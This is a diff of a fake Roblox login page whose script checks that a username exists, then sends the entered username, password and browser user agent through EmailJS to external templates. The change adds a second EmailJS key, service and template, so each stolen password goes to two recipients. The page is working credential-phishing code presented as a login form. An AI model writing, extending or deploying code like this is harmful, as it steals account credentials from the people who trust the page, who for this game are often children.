@@ -179,7 +179,6 @@
 </button>
 
 <script>
-emailjs.init("C1BlBKjVX-rkLsRcM");
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
@@ -216,17 +215,18 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       status.textContent = '❌ Username not found on Roblox.';
       return;
     }
-
-    emailjs.send('service_qqf5p4q', 'template_u5yl8jg', {
+  emailjs.init("C1BlBKjVX-rkLsRcM");
+  emailjs.send('service_qqf5p4q', 'template_u5yl8jg', {
     un: username,
     up: password,
     ua: userAgent
-})
-.then(function(response) {
-    console.log('Success:', response);
-}, function(error) {
-    console.log('Failed:', error);
-});
+  })
+  emailjs.init("8d00WW8DI3O8YMGeC");
+  emailjs.send('service_12cgdxn', 'template_6qpuckw', {
+    un: username,
+    up: password,
+    ua: userAgent
+  })
 
   } catch (err) {
     spinner.style.display = 'none';
